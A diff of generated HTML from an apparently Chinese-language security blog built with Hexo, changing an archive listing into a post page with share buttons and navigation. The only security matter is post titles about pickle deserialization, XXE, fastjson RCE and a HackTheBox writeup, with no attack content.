-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/09/python安全之pickle反序列化/" class="archive-article-date">
-  	<time datetime="2020-03-09T09:48:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/09/python安全之pickle反序列化/">python安全之pickle反序列化</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color4">CTF</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2020/05/26/xxe从入门到入门/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/09/hackthebox环境配置及入门关卡writeup/" class="archive-article-date">
-  	<time datetime="2020-01-09T15:01:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-09</time>
-</a>
-        </div>
-    	 
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/09/hackthebox环境配置及入门关卡writeup/">hackthebox环境配置及入门关卡writeup</a>
-    </h1>
+  
+    <a href="/2020/05/25/fastjson-rce利用踩坑/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">fastjson rce利用踩坑</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+    <div class="duoshuo"></div>
   
 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -532,8 +303,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
